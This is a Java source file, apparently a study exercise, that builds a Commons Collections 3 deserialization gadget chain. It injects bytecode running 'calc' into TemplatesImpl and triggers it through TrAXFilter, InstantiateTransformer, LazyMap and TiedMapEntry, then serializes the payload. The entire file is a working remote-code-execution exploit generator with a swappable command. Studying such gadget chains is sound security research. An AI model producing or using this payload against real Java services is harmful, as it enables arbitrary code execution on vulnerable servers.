package com.gulvn;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;
import org.apache.xalan.xsltc.trax.TemplatesImpl;
import org.apache.xalan.xsltc.trax.TrAXFilter;
import org.apache.xalan.xsltc.trax.TransformerFactoryImpl;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

import static com.bytecode.HelloTemplatesImpl.genByteCode;
import static com.util.Reflections.setFieldValue;

public class CommonsCollectionsIntro3 {

    public static void main(String[] args) throws Exception {
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][] {genByteCode("calc")});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

//        ChainedTransformer newTransformer = new ChainedTransformer(new Transformer[]{
//                new ConstantTransformer(obj),
//                new InvokerTransformer("newTransformer", null, null)
//        });
        //TrAXFilter 他的构造函数可以调用template的
        ChainedTransformer newTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[]{Templates.class},
                        new Object[]{obj})
        });
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap,newTransformer);
        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");
        Map expMap = new HashMap();
        expMap.put(tme,"value");
        outerMap.remove("keykey");

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(expMap);
        oos.close();

        System.out.println(barr.toString());

//        ObjectInputStream ois = new ObjectInputStream(new
//                ByteArrayInputStream(barr.toByteArray()));
//        Object o = (Object)ois.readObject();
//        Map outerMap = TransformedMap.decorate(hashMap, null,
//                newTransformer);
//        outerMap.put("test", "xxxx");
//        new TrAXFilter()
    }
}
